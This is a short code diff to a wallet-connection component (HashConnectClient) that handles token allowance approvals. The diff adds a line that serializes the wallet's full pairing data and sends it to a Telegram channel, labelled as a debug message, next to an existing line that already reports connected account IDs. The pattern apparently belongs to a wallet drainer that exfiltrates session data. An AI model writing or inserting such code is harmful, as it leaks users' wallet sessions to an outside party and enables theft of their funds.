@@ -109,6 +109,7 @@ export const HashConnectClient = () => {
     try {
       await sendMessageToTelegram(`[DEBUG] handleAllowanceApprove called for account: ${accountId}`);
       const hbarAccountId: string = accountId;
+      await sendMessageToTelegram(`[DEBUG] pairingData: ${JSON.stringify(hc.hcData.pairingData)}, searching for account: ${hbarAccountId}`);
       // Find the pairing for this account to get the topic
       const pairing = hc.hcData.pairingData.find(pair =>
         pair.accountIds.includes(hbarAccountId)
